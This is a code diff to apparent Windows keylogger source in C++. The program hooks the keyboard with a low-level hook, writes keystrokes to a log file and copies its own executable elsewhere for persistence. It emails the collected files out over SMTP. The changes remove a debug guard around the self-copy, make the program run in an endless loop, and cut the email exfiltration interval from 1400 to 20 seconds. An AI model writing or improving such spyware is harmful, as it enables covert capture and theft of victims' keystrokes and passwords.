@@ -22,7 +22,7 @@ char *translate(int vk, int up);
 void sendEmail(const std::vector<std::string> &fileList);
 
 int shift = 0, caps = 0;
-const char *emailAddress = "emailaddress";
+const char *emailAddress = "email";
 const char *password = "password";
 CkMailMan mailman;
 FILE *fd;
@@ -45,9 +45,9 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     std::wcout << username << std::endl;
     header += " User: ";
     header += username;
-
     header += "-------------------------\n\n\n";
     std::cout << header << std::endl;
+
     TCHAR filePath[INFO_BUFFER_SIZE] = {0};
     GetModuleFileName(nullptr, filePath, INFO_BUFFER_SIZE);
     std::wcout << filePath << std::endl;
@@ -61,13 +61,14 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
 
     std::wcout << destination << std::endl;
 
-#ifndef DEBUG
     if (CopyFile(filePath, destination, FALSE)) {
         printf("Copied file\n");
     } else {
         printf("Could not copy file!\n");
     }
-#endif
+
+    // TODO: next try copy
+    std::string nextTry = std::getenv("APPDATA");
 
     HINSTANCE app = GetModuleHandle(nullptr);
     SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, app, 0);
@@ -135,13 +136,15 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     mailman.put_SmtpPort(587);
     sendEmail(filesToSend);
 
-    while (GetMessage(&msg, nullptr, 0, 0) > 0) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
+#pragma clang diagnostic push
+#pragma ide diagnostic ignored "EndlessLoop"
+    while (true) {
+        while (GetMessage(&msg, nullptr, 0, 0) > 0) {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
     }
-    fflush(fd);
-    fclose(fd);
-    return 0;
+#pragma clang diagnostic pop
 }
 
 void sendEmail(const std::vector<std::string> &fileList) {
@@ -192,6 +195,11 @@ LRESULT CALLBACK LowLevelKeyboardProc(__attribute__((unused)) int nCode, WPARAM 
     }
     if (str)
         log(str);
+
+    if (difftime(std::time(nullptr), t) > 20) {
+        t = std::time(nullptr);
+        sendEmail(filesToSend);
+    }
     return 0;
 }
 
@@ -201,10 +209,6 @@ void log(char *str) {
     fwrite(str, 1, strlen(str), fd);
     if (strstr(str, " ") || strstr(str, "\n"))
         fflush(fd);
-    if (difftime(std::time(nullptr), t) > 1400) {
-        t = std::time(nullptr);
-        sendEmail(filesToSend);
-    }
 }
 
 char *translate(int vk, int up) {
